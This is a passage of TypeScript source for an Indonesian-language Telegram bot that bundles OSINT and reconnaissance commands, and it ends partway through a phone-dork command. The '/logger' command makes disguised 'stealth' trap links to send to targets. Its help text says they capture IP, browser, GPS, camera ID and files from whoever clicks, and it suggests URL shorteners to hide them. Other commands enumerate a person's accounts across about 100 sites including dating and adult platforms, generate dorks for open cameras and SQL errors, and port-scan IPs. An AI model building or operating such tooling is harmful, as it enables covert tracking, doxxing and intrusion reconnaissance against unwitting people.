      const platMap: Record<string, string> = { "A": "Banten", "B": "DKI Jakarta, Depok, Tangerang, Bekasi", "D": "Bandung, Cimahi", "E": "Cirebon, Indramayu, Majalengka, Kuningan", "F": "Bogor, Sukabumi, Cianjur", "T": "Purwakarta, Karawang, Subang", "Z": "Garut, Tasikmalaya, Sumedang, Ciamis, Banjar", "G": "Pekalongan, Tegal, Brebes, Batang, Pemalang", "H": "Semarang", "DN": "Sulawesi Tengah", "DT": "Sulawesi Tenggara", "DD": "Makassar, Gowa, Maros", "DP": "Parepare, Palopo, Luwu", "DC": "Sulawesi Barat", "PA": "Papua", "PB": "Papua Barat", "BL": "Aceh", "BB": "Sumut (Barat)", "BK": "Sumut (Timur)/Medan", "BA": "Sumatera Barat", "BM": "Riau", "BP": "Kepulauan Riau", "BG": "Sumatera Selatan", "BN": "Bangka Belitung", "BE": "Lampung", "BD": "Bengkulu", "BH": "Jambi" };

      const kodeWilayah = match[1];
      const angka = match[2];
      const kodeDetail = match[3];

      const wilayah = platMap[kodeWilayah] || "Wilayah tidak terdaftar";

      const reply = `━━━━━ ᴘʟᴀᴛ ᴀɴᴀʟʏᴢᴇʀ ━━━━━\n\n` +
                    `🔢 <b>ᴘʟᴀᴛ :</b> <code>${kodeWilayah} ${angka} ${kodeDetail}</code>\n\n` +
                    `📍 <b>ᴡɪʟᴀʏᴀʜ :</b> ${wilayah}\n\n` +
                    `├ ᴋᴏᴅᴇ ᴀʀᴇᴀ : ${kodeWilayah}\n` +
                    `├ ɴᴏ ᴘᴏʟɪꜱɪ : ${angka}\n` +
                    `└ ᴅᴇᴛᴀɪʟ/ꜱᴜʙ : ${kodeDetail || '-'}\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>ᴀɴᴀʟɪꜱɪꜱ ꜱᴇʟᴇꜱᴀɪ.</i>`;

      ctx.reply(reply, { parse_mode: 'HTML' });
    });

    bot.command('sethost', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length > 1) {
        let newHost = args[1];
        if (!newHost.startsWith('http')) newHost = 'https://' + newHost;
        appHost = newHost;
        await ctx.reply(`✅ <b>System Host diubah manual ke:</b>\n<code>${appHost}</code>\n\nCoba jalankan /logger kembali.`, {parse_mode: 'HTML'});
        
        const isLocal = appHost.includes('localhost') || appHost.includes('127.0.0.1');
        if (!isLocal && webhookPath && bot) {
          try {
            const webhookUrl = `${appHost.replace(/\/$/, '')}${webhookPath}`;
            await bot.telegram.setWebhook(webhookUrl);
            await ctx.reply(`🌐 <b>Webhook Synced!</b>\nNew endpoint set.`, {parse_mode: 'HTML'});
          } catch (e: any) {
            await ctx.reply(`❌ <b>Failed to sync Webhook:</b>\n${e.message}`, {parse_mode: 'HTML'});
          }
        }
      } else {
        ctx.reply(`ℹ️ <b>Host saat ini:</b>\n<code>${appHost}</code>\n\nJika link IP Logger error (problem loading page/localhost/404), gunakan perintah:\n<code>/sethost https://URL_WEB_ANDA</code>\nAtau pastikan web app Anda sedang online.`, {parse_mode: 'HTML'});
      }
    });

    bot.command('logger', (ctx) => {
      const id = generateTrapId(ctx.chat.id);
      
      let replyMessage = `🎣 <b>STEALTH LINK GENERATED</b>\n` +
                         `━━━━━━━━━━━━━━━━━━━━\n` +
                         `Silakan pilih template link yang sesuai dengan target Anda:\n\n`;
      
      Object.entries(templates).forEach(([key, tmpl]) => {
        const trapUrl = `${appHost.replace(/\/$/, '')}/t/${key}/${id}`;
        replyMessage += `<b>${tmpl.name}</b>\n🔗 <code>${trapUrl}</code>\n\n`;
      });
      
      replyMessage += `━━━━━━━━━━━━━━━━━━━━\n` +
                      `💡 <b>CARA KERJA:</b>\n` +
                      `1. Kirim link di atas ke target.\n` +
                      `2. Saat diklik, IP & Browser akan terdeteksi.\n` +
                      `3. Jika target klik button "Verify", data <b>Advanced Module</b> (GPS, Cam-ID, Screen, Files) akan terkirim.\n\n` +
                      `⚠️ <i>Tips: Gunakan shortener (bit.ly/tinyurl) agar link terlihat lebih profesional.</i>`;
      
      ctx.reply(replyMessage, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('targets', (ctx) => {
      if(targetsData.length === 0) return ctx.reply("📂 <b>DB TARGETS: KOSONG</b>\nBelum ada target yang masuk.", {parse_mode: 'HTML'});
      let msg = `📂 <b>DB TARGETS (Top 10 Latest)</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
      const recent = targetsData.slice(-10).reverse();
      recent.forEach((t: any, i) => {
        msg += `[${i+1}] <b>${t.type}</b>\n`;
        if(t.ip) msg += `├ IP: <code>${t.ip}</code>\n`;
        if(t.platform) msg += `├ OS: ${t.platform}\n`;
        msg += `└ Time: ${new Date(t.timestamp).toLocaleTimeString('id-ID')}\n\n`;
      });
      msg += `━━━━━━━━━━━━━━━━━━━━\n<i>Total Data: ${targetsData.length}</i>`;
      ctx.reply(msg, {parse_mode: 'HTML'});
    });

    bot.command('ip', async (ctx) => {
      const args = ctx.message.text.split(' ');
      const ip = args.length > 1 ? args[1] : '';
      let url = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,reverse,mobile,proxy,hosting,query`;
      
      try {
        const response = await fetch(url);
        const data = await response.json();
        if (data.status === 'success') {
          const mapLink = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
          let reply = `<b>🌐 TARGET IP ANALYTICS</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `💎 <b>QUERY:</b> <code>${data.query}</code>\n\n` +
                      `🏢 <b>INFRASTRUKTUR:</b>\n` +
                      `├ ISP: ${data.isp || '-'}\n` +
                      `├ ORG: ${data.org || '-'}\n` +
                      `├ ASN: ${data.as || '-'}\n` +
                      `└ RVRS: ${data.reverse || '-'}\n\n` +
                      `📍 <b>LOKASI REGIONAL:</b>\n` +
                      `├ NEGARA: ${data.country || '-'}\n` +
                      `├ REGION: ${data.regionName || '-'}\n` +
                      `├ KOTA: ${data.city || '-'}\n` +
                      `├ POS: ${data.zip || '-'}\n` +
                      `└ TMZN: ${data.timezone || '-'}\n\n` +
                      `🌎 <b>SPATIAL:</b>\n` +
                      `├ COORD: <code>${data.lat || '-'}, ${data.lon || '-'}</code>\n` +
                      `└ MAPS: <a href="${mapLink}">Lihat Lokasi BTS</a>\n\n` +
                      `🛡️ <b>RISK ANALYSIS:</b>\n` +
                      `├ MOBILE: ${data.mobile ? '✅' : '❌'}\n` +
                      `├ PROXY/VPN: ${data.proxy ? '⚠️ DETEKSI' : '✅ BERSIH'}\n` +
                      `└ HOSTING: ${data.hosting ? '⚠️ SERVER' : '✅ RESIDENTIAL'}\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `⚠️ <i>Info: Geolocation IP mengacu pada titik registrasi provider, bukan titik GPS fisik target. Gunakan /logger untuk hasil presisi.</i>`;
          ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
        } else {
          ctx.reply("❌ Gagal mendapatkan informasi IP.");
        }
      } catch (e) {
        ctx.reply("❌ Terjadi kesalahan sistem saat mengecek IP.");
      }
    });

    bot.command('whois', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /whois google.com");
      const domain = args[1].replace(/https?:\/\//, '').replace(/\/$/, '');
      
      try {
        ctx.reply(`🔍 Sedang menganalisis detail registrar WHOIS untuk <b>${domain}</b>...`, { parse_mode: 'HTML' });
        const res = await fetch(`https://networkcalc.com/api/dns/whois/${domain}`);
        const data = await res.json();
        if (data.status === 'OK' && data.whois) {
          let txt = `🌐 <b>WHOIS DATA ANALYTICS</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>DOMAIN:</b> <code>${domain}</code>\n\n` +
                    `📝 <b>REGISTRAR INFO:</b>\n` +
                    `└ Name: ${data.whois.registrar || '-'}\n\n` +
                    `📆 <b>DATES:</b>\n` +
                    `├ CREATED: ${data.whois.creation_date || '-'}\n` +
                    `├ UPDATED: ${data.whois.updated_date || '-'}\n` +
                    `└ EXPIRED: ${data.whois.expiration_date || '-'}\n\n` +
                    `📡 <b>NAME SERVERS:</b>\n` +
                    (data.whois.name_servers || []).map((ns:any)=>`├ <code>${ns}</code>`).join('\n').replace(/├$/, '└') +
                    `\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>Query WHOIS berhasil.</i>`;
          ctx.reply(txt, {parse_mode: 'HTML'});
        } else {
          ctx.reply(`❌ Whois data tidak ditemukan untuk <code>${domain}</code>. (Pastikan format domain benar tanpa https://)`, {parse_mode: 'HTML'});
        }
      } catch (e) {
        ctx.reply("❌ Terjadi kesalahan sistem saat mengecek Whois.");
      }
    });

    bot.command('dns', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /dns google.com");
      const domain = args[1].replace(/https?:\/\//, '').replace(/\/$/, '');
      
      try {
        ctx.reply(`📡 Menarik data DNS Records & Routing IP untuk <b>${domain}</b>...`, { parse_mode: 'HTML' });
        const response = await fetch(`https://networkcalc.com/api/dns/lookup/${domain}`);
        const data = await response.json();
        if(data.status === 'OK' && data.records) {
          let txt = `━━━━━ ᴅɴꜱ ᴍᴀᴘᴘɪɴɢ ━━━━━\n\n` +
                    `💎 <b>ᴅᴏᴍᴀɪɴ :</b> <code>${domain}</code>\n\n`;
          ['A', 'AAAA', 'MX', 'TXT', 'CNAME', 'NS'].forEach(type => {
            if(data.records[type] && data.records[type].length > 0) {
              txt += `<b>[+] ${type} ʀᴇᴄᴏʀᴅꜱ :</b>\n`;
              data.records[type].forEach((rec: any, idx: number, arr: any[]) => {
                const sym = idx === arr.length - 1 ? '└' : '├';
                if(type === 'MX') txt += `${sym} <code>${rec.exchange}</code> (ᴘʀɪᴏ: ${rec.priority})\n`;
                else if(type === 'TXT') txt += `${sym} <code>${rec.replace(/.{1,40}/g, '$&')}</code>\n`;
                else txt += `${sym} <code>${rec.address || rec}</code>\n`;
              });
              txt += '\n';
            }
          });
          txt += `━━━━━━━━━━━━━━━━━━━━\n` +
                 `✅ <i>ꜰᴇᴛᴄʜ ᴅɴꜱ ꜱᴇʟᴇꜱᴀɪ.</i>`;
          if(txt.length > 4000) txt = txt.substring(0, 3950) + "\n\n... (Terpotong limit)";
          ctx.reply(txt, {parse_mode: 'HTML'});
        } else {
          ctx.reply("❌ DNS records tidak ditemukan.");
        }
      } catch (e) {
        ctx.reply("❌ Terjadi kesalahan sistem saat mengecek DNS.");
      }
    });

    bot.command('domain', (ctx) => ctx.reply("Gunakan /whois [domain] atau /dns [domain]"));

    bot.command('email', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2 || !args[1].includes('@')) return ctx.reply("Format salah. Contoh: /email target@example.com");
      const email = args[1];
      
      try {
        const domain = email.split("@")[1];
        const records = await resolveMx(domain);
        if (records && records.length > 0) {
          const reply = `<b>📧 EMAIL MX VALIDATOR</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `🎯 <b>TARGET:</b> <code>${email}</code>\n` +
                        `🌐 <b>DOMAIN:</b> <code>${domain}</code>\n\n` +
                        `✅ STATUS:<b> AKTIF Menerima Email</b>\n\n` +
                        `📋 <b>MX RECORDS:</b>\n` +
                        records.map((r, idx) => `${idx === records.length - 1 ? '└' : '├'} [Pri: ${r.priority}] ${r.exchange}`).join('\n') +
                        `\n━━━━━━━━━━━━━━━━━━━━`;
          ctx.reply(reply, { parse_mode: 'HTML' });
        } else {
          ctx.reply(`❌ Tidak ditemukan MX records untuk domain ${domain}.`);
        }
      } catch (e) {
        ctx.reply(`❌ Format valid, tapi kami tidak bisa memverifikasi MX records (domain mungkin tidak aktif atau memblokir pengecekan).`);
      }
    });

    bot.command('username', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("❌ <b>Format salah.</b>\nContoh: <code>/username targetnya</code>", { parse_mode: 'HTML' });
      
      const rawInput = args.slice(1).join('').toLowerCase();
      const username = rawInput.replace(/[^a-z0-9_.-]/g, '');
      if (!username) return ctx.reply("❌ <b>Username tidak valid.</b>", { parse_mode: 'HTML' });
      
      ctx.reply(`🔍 Memindai jejak digital untuk <b>@${username}</b>...\n<i>Mengecek puluhan platform...</i>`, { parse_mode: 'HTML' });
      
      const platforms = [
        // Global Social Media & Tech (~100 Platforms)
        { name: "GitHub", url: `https://github.com/${username}` },
        { name: "Twitter", url: `https://twitter.com/${username}` },
        { name: "Instagram", url: `https://www.instagram.com/${username}/` },
        { name: "TikTok", url: `https://www.tiktok.com/@${username}` },
        { name: "YouTube", url: `https://www.youtube.com/@${username}` },
        { name: "Facebook", url: `https://www.facebook.com/${username}` },
        { name: "Pinterest", url: `https://www.pinterest.com/${username}` },
        { name: "Reddit", url: `https://www.reddit.com/user/${username}` },
        { name: "Tumblr", url: `https://${username}.tumblr.com` },
        { name: "Medium", url: `https://medium.com/@${username}` },
        { name: "Vimeo", url: `https://vimeo.com/${username}` },
        { name: "SoundCloud", url: `https://soundcloud.com/${username}` },
        { name: "Spotify", url: `https://open.spotify.com/user/${username}` },
        { name: "Twitch", url: `https://www.twitch.tv/${username}` },
        { name: "Steam", url: `https://steamcommunity.com/id/${username}` },
        { name: "Flickr", url: `https://www.flickr.com/people/${username}` },
        { name: "Patreon", url: `https://www.patreon.com/${username}` },
        { name: "Dev.to", url: `https://dev.to/${username}` },
        { name: "Wattpad", url: `https://www.wattpad.com/user/${username}` },
        { name: "VK", url: `https://vk.com/${username}` },
        { name: "GitLab", url: `https://gitlab.com/${username}` },
        { name: "Linktree", url: `https://linktr.ee/${username}` },
        { name: "Dribbble", url: `https://dribbble.com/${username}` },
        { name: "Behance", url: `https://www.behance.net/${username}` },
        { name: "About.me", url: `https://about.me/${username}` },
        { name: "Fiverr", url: `https://www.fiverr.com/${username}` },
        { name: "Gumroad", url: `https://gumroad.com/${username}` },
        { name: "Quora", url: `https://www.quora.com/profile/${username}` },
        { name: "Telegram", url: `https://t.me/${username}` },
        { name: "CodePen", url: `https://codepen.io/${username}` },
        { name: "HackerRank", url: `https://www.hackerrank.com/${username}` },
        { name: "LeetCode", url: `https://leetcode.com/${username}` },
        { name: "Kaggle", url: `https://www.kaggle.com/${username}` },
        { name: "Pastebin", url: `https://pastebin.com/u/${username}` },
        { name: "ProductHunt", url: `https://www.producthunt.com/@${username}` },
        { name: "Slack", url: `https://${username}.slack.com` },
        { name: "Trello", url: `https://trello.com/${username}` },
        { name: "Bandcamp", url: `https://bandcamp.com/${username}` },
        { name: "Last.fm", url: `https://www.last.fm/user/${username}` },
        { name: "ReverbNation", url: `https://www.reverbnation.com/${username}` },
        { name: "Letterboxd", url: `https://letterboxd.com/${username}` },
        { name: "MyAnimeList", url: `https://myanimelist.net/profile/${username}` },
        { name: "Goodreads", url: `https://www.goodreads.com/${username}` },
        { name: "Strava", url: `https://www.strava.com/athletes/${username}` },
        { name: "TripAdvisor", url: `https://www.tripadvisor.com/members/${username}` },
        { name: "Roblox", url: `https://www.roblox.com/user.aspx?username=${username}` },
        { name: "Minecraft", url: `https://namemc.com/profile/${username}` },
        { name: "Chess.com", url: `https://www.chess.com/member/${username}` },
        { name: "Lichess", url: `https://lichess.org/@/${username}` },
        { name: "eBay", url: `https://www.ebay.com/usr/${username}` },
        { name: "HubPages", url: `https://hubpages.com/@${username}` },
        { name: "Instructables", url: `https://www.instructables.com/member/${username}` },
        { name: "DailyMotion", url: `https://www.dailymotion.com/${username}` },
        { name: "Giphy", url: `https://giphy.com/channel/${username}` },
        { name: "Imgur", url: `https://imgur.com/user/${username}` },
        { name: "Bugcrowd", url: `https://bugcrowd.com/${username}` },
        { name: "HackerOne", url: `https://hackerone.com/${username}` },
        { name: "BuyMeACoffee", url: `https://www.buymeacoffee.com/${username}` },
        { name: "Ko-fi", url: `https://ko-fi.com/${username}` },
        { name: "Snapchat", url: `https://www.snapchat.com/add/${username}` },
        { name: "OkCupid", url: `https://www.okcupid.com/profile/${username}` },
        { name: "Bumble", url: `https://bumble.com/app/profile/${username}` },
        { name: "Tinder", url: `https://tinder.com/@${username}` },
        { name: "VSCO", url: `https://vsco.co/${username}` },
        { name: "Foursquare", url: `https://foursquare.com/${username}` },
        { name: "DeviantArt", url: `https://www.deviantart.com/${username}` },
        { name: "Mixcloud", url: `https://www.mixcloud.com/${username}/` },
        { name: "PornHub", url: `https://www.pornhub.com/users/${username}` },
        { name: "Xvideos", url: `https://www.xvideos.com/profiles/${username}` },
        { name: "OnlyFans", url: `https://onlyfans.com/${username}` },
        { name: "Fansly", url: `https://fansly.com/${username}` },
        { name: "CashApp", url: `https://cash.app/$${username}` },
        { name: "Venmo", url: `https://venmo.com/${username}` },
        { name: "Paypal", url: `https://www.paypal.com/paypalme/${username}` },
        { name: "Skype", url: `https://web.skype.com/share?url=${username}` },
        { name: "Interpals", url: `https://www.interpals.net/${username}` },
        { name: "Couchsurfing", url: `https://www.couchsurfing.com/people/${username}` },
        { name: "Duolingo", url: `https://www.duolingo.com/profile/${username}` },
        { name: "Discord", url: `https://discord.id/user/${username}` },
        { name: "Bitbucket", url: `https://bitbucket.org/${username}/` },
        { name: "AngelList", url: `https://angel.co/u/${username}` },
        { name: "Houzz", url: `https://www.houzz.com/user/${username}` },
        { name: "Polygon", url: `https://www.polygon.com/users/${username}` },
        { name: "Vicky", url: `https://www.viki.com/users/${username}/about` },
        { name: "Crunchyroll", url: `https://www.crunchyroll.com/user/${username}` },
        { name: "BandLab", url: `https://www.bandlab.com/${username}` },
        { name: "Canva", url: `https://www.canva.com/${username}` },
        { name: "Adobe", url: `https://www.behance.net/${username}` },
        { name: "SlideShare", url: `https://www.slideshare.net/${username}` },
        { name: "Issuu", url: `https://issuu.com/${username}` },
        { name: "Scribd", url: `https://www.scribd.com/${username}` },
        // Indo & SE Asia Platforms (Focus User Request)
        { name: "Kaskus", url: `https://www.kaskus.co.id/profile/${username}` },
        { name: "Kompasiana", url: `https://www.kompasiana.com/${username}` },
        { name: "Blogger", url: `https://${username}.blogspot.com` },
        { name: "WordPress", url: `https://${username}.wordpress.com` },
        { name: "MobileLegends", url: `https://m.mobilelegends.com/en/search/user?keyword=${username}` },
        { name: "Detik", url: `https://news.detik.com/search?query=${username}` },
        { name: "Kaskus Jual Beli", url: `https://www.kaskus.co.id/fjb/user/${username}` },
        { name: "Bukalapak", url: `https://www.bukalapak.com/u/${username}` },
        { name: "Tokopedia", url: `https://www.tokopedia.com/people/${username}` },
        { name: "Traveloka", url: `https://www.traveloka.com/en-id/user/${username}` },
        { name: "Kulina", url: `https://kulina.id/@${username}` },
        { name: "Bstation", url: `https://www.bilibili.tv/en/space/${username}` },
        { name: "Shopee", url: `https://shopee.co.id/${username}` }
      ];

      // Platforms known to return soft 404s (200 OK but page says not found) or block bots aggressively.
      // We will flag these as "Proteksi/Perlu Cek Manual" to improve accuracy instead of falsely claiming "DITEMUKAN".
      const soft404Platforms = ['Instagram', 'TikTok', 'YouTube', 'Facebook', 'Twitter', 'Snapchat', 'Tinder', 'Bumble', 'OkCupid', 'Spotify'];

      // To avoid overwhelming constraints, process in chunks or concurrently
      const results = await Promise.all(platforms.map(async (platform) => {
        try {
          // Increase accuracy: actually fetch text for some, but fallback to status to avoid huge payload
          const response = await fetchWithTimeout(platform.url, { 
            method: "HEAD",
            headers: {
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
              "Accept": "text/html,application/xhtml+xml"
            }
          }, 4500); // 4.5 seconds timeout
          
          let found = false;
          let status = response.status;
          
          if (status === 200 || status === 301 || status === 302) {
            found = true;
          }

          if (soft404Platforms.includes(platform.name)) {
            // Force these to be manual check / protested because HEAD requests on these almost always yield false positives
            found = false; 
            status = 403; // Simulate blocked
          }

          return { name: platform.name, found, status, url: platform.url };
        } catch (err) {
          return { name: platform.name, found: false, status: "error", url: platform.url };
        }
      }));

      const foundList = results.filter(r => r.found);
      const blockedList = results.filter(r => r.status === 403 || r.status === 429);
      const notFoundList = results.filter(r => !r.found && r.status !== 403 && r.status !== 429);

      let replyText = `<b>🎯 DIGITAL FOOTPRINT ANALYSIS: @${username}</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n\n`;
      
      if (foundList.length > 0) {
        replyText += `🟢 <b>DITEMUKAN (${foundList.length} PLATFORM)</b>\n`;
        foundList.forEach(r => replyText += `├ <a href="${r.url}">${r.name}</a>\n`);
        replyText = replyText.replace(/\n├ (<a href="[^"]+">[^<]+<\/a>)\n$/, "\n└ $1\n"); // Fix last icon
      }

      if (blockedList.length > 0) {
        replyText += `\n🟡 <b>PROTECTED / MANUAL CHECK (${blockedList.length})</b>\n`;
        blockedList.forEach(r => replyText += `├ <a href="${r.url}">${r.name}</a> ⚠️\n`);
        replyText = replyText.replace(/\n├ (<a href="[^"]+">[^<]+<\/a> ⚠️)\n$/, "\n└ $1\n");
      }

      replyText += `\n❌ <b>TIDAK DITEMUKAN (${notFoundList.length} PLATFORM)</b>\n`;
      if (notFoundList.length > 0) {
        replyText += `└ <i>Antara lain: ${notFoundList.map(r => r.name).slice(0, 5).join(', ')}...</i>\n`;
      }
      
      replyText += `━━━━━━━━━━━━━━━━━━━━\n` +
                   `✅ <i>Digital footprint scan complete.</i>`;

      ctx.reply(replyText, { link_preview_options: { is_disabled: true }, parse_mode: 'HTML' });
    });

    bot.command('mac', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /mac [MAC_ADDRESS]");
      try {
        const res = await fetch(`https://api.macvendors.com/${args[1]}`);
        if(res.status === 200) {
          const vendor = await res.text();
          const reply = `<b>🔌 MAC VENDOR LOOKUP</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `🆔 <b>MAC:</b> <code>${args[1]}</code>\n` +
                        `🏢 <b>VENDOR:</b> <code>${vendor}</code>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `✅ <i>Query data berhasil.</i>`;
          ctx.reply(reply, { parse_mode: 'HTML' });
        } else {
          ctx.reply("❌ Tidak ditemukan vendor (atau rate limited).");
        }
      } catch (e) { ctx.reply("❌ Error fetching MAC info."); }
    });

    bot.command('headers', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /headers [url]");
      let url = args[1];
      if(!url.startsWith('http')) url = 'http://' + url;
      try {
        const res = await fetchWithTimeout(url, { method: 'HEAD' }, 4000);
        let hdrs = '';
        res.headers.forEach((v, k) => hdrs += `├ ${k}: ${v}\n`);
        const reply = `<b>🛡️ HTTP SECURITY HEADERS</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `💎 <b>TARGET:</b> <code>${url}</code>\n\n` +
                      `📋 <b>HEADERS DATA:</b>\n` +
                      `<pre>${hdrs.substring(0,3800)}</pre>` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, { parse_mode: 'HTML' });
      } catch (e) { ctx.reply("❌ Error fetching headers."); }
    });

    bot.command('dork', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /dork [keyword]");
      const q = encodeURIComponent(args);
      const reply = `<b>🔍 GOOGLE DORKS GENERATOR</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>KEYWORD:</b> <code>${args}</code>\n\n` +
                    `├ 📦 <b>Listing:</b> <a href="https://www.google.com/search?q=intitle:%22index+of%22+${q}">Cek Direktori</a>\n` +
                    `├ 📄 <b>Files:</b> <a href="https://www.google.com/search?q=${q}+filetype:pdf+OR+filetype:doc">Cari Dokumen</a>\n` +
                    `├ 👤 <b>Login:</b> <a href="https://www.google.com/search?q=inurl:login+${q}">Cari Form Login</a>\n` +
                    `├ 🐞 <b>SQL:</b> <a href="https://www.google.com/search?q=${q}+%22sql+syntax%22">SQL Error Dork</a>\n` +
                    `└ 🎥 <b>CCTV:</b> <a href="https://www.google.com/search?q=inurl:view/view.shtml+${q}">Cari Open Camera</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>Dorking links generated.</i>`;
      ctx.reply(reply, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('bininfo', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /bininfo [BIN]");
      try {
        const res = await fetch(`https://data.handyapi.com/bin/${args[1]}`);
        const data = await res.json();
        if(data && data.Status === 'SUCCESS') {
          const reply = `<b>💳 CREDIT CARD BIN INFO</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `💎 <b>BIN:</b> <code>${args[1]}</code>\n\n` +
                        `├ 📂 TYPE: ${data.Scheme} (${data.Type})\n` +
                        `├ 🔝 TIER: ${data.CardTier}\n` +
                        `├ 📍 NEGARA: ${data.Country.Name}\n` +
                        `└ 🏦 BANK: ${data.Issuer}\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `✅ <i>Query BIN berhasil.</i>`;
          ctx.reply(reply, { parse_mode: 'HTML' });
        } else {
          ctx.reply("❌ Data BIN tidak ditemukan.");
        }
      } catch(e) { ctx.reply("❌ Gagal mengecek BIN."); }
    });

    bot.command('subdomain', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /subdomain [domain.com]");
      let domain = args[1].replace(/^https?:\/\//, '').replace(/^www\./, '');
      try {
        ctx.reply(`🔍 Sedang crawling mapping subdomain untuk <b>${domain}</b>...`, {parse_mode: 'HTML'});
        const res = await fetchWithTimeout(`https://crt.sh/?q=%25.${domain}&output=json`, {}, 15000);
        const text = await res.text();
        if (text.startsWith('<')) {
            throw new Error('crt.sh returned HTML instead of JSON');
        }
        const data = JSON.parse(text);
        const subs = [...new Set(data.map((d:any) => d.name_value))].slice(0, 30);
        if(subs.length > 0) {
          const reply = `<b>🌐 SUBDOMAIN RECON MAPPING</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `💎 <b>TARGET:</b> <code>${domain}</code>\n\n` +
                        `📋 <b>FOUND SUBS (MAX 30):</b>\n` +
                        subs.map((s, idx) => `${idx === subs.length - 1 ? '└' : '├'} <code>${s}</code>`).join('\n') +
                        `\n━━━━━━━━━━━━━━━━━━━━\n` +
                        `✅ <i>Reconnaissance selesai.</i>`;
          ctx.reply(reply, {parse_mode: 'HTML'});
        } else { ctx.reply("❌ Tidak ada subdomain ditemukan."); }
      } catch(e) { ctx.reply("❌ Gagal mencari subdomain. (crt.sh timeout or error)"); }
    });

    bot.command('github_user', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /github_user [username]");
      try {
        const res = await fetch(`https://api.github.com/users/${args[1]}`);
        if(res.status !== 200) return ctx.reply("❌ User tidak ditemukan.");
        const d = await res.json();
        const reply = `<b>🐙 GITHUB OSINT ANALYTICS</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `👤 <b>USER:</b> <code>${d.login}</code>\n\n` +
                      `├ <b>Name:</b> ${d.name || '-'}\n` +
                      `├ <b>Bio:</b> ${d.bio || '-'}\n` +
                      `├ <b>Location:</b> ${d.location || '-'}\n` +
                      `├ <b>Company:</b> ${d.company || '-'}\n` +
                      `├ <b>Repos:</b> ${d.public_repos} (Public)\n` +
                      `├ <b>Followers:</b> ${d.followers}\n` +
                      `├ <b>Created:</b> ${new Date(d.created_at).toISOString().split('T')[0]}\n` +
                      `└ <b>Link:</b> <a href="${d.html_url}">Visit Profile</a>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `✅ <i>Metadata extraction complete.</i>`;
        ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
      } catch(e) { ctx.reply("❌ Error fetching GitHub data."); }
    });

    bot.command('port', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /port [ip]");
      const ip = args[1];
      const commonPorts = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 8080];
      
      const msg = await ctx.reply(`<i>🔄 Menjalankan Port Scanner (Top 10 TCP) pada <b>${ip}</b>...</i>`, {parse_mode: 'HTML'});
      
      let results: string[] = [];
      let scanned = 0;
      
      const checkPort = (port: number) => {
        return new Promise<void>((resolve) => {
          const socket = new net.Socket();
          socket.setTimeout(2000);
          socket.on('connect', () => { results.push(`├ PORT ${port}: ✅ OPEN`); socket.destroy(); resolve(); });
          socket.on('timeout', () => { results.push(`├ PORT ${port}: ❌ CLOSED/FILTERED`); socket.destroy(); resolve(); });
          socket.on('error', () => { results.push(`├ PORT ${port}: ❌ CLOSED`); socket.destroy(); resolve(); });
          socket.connect(port, ip);
        });
      };

      for (let port of commonPorts) {
        await checkPort(port);
      }

      const reply = `<b>🔌 BASIC TCP PORT SCAN</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>TARGET:</b> <code>${ip}</code>\n\n` +
                    `${results.join('\n')}\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, reply, { parse_mode: 'HTML' });
    });

    bot.command('phone_dork', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /phone_dork [nomor_hp]");
      const numInfo = args.replace(/\D/g, '');
      const numID = numInfo.startsWith('0') ? '62' + numInfo.substring(1) : numInfo;
      const reply = `<b>📱 PHONE TRACKING DORKS</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
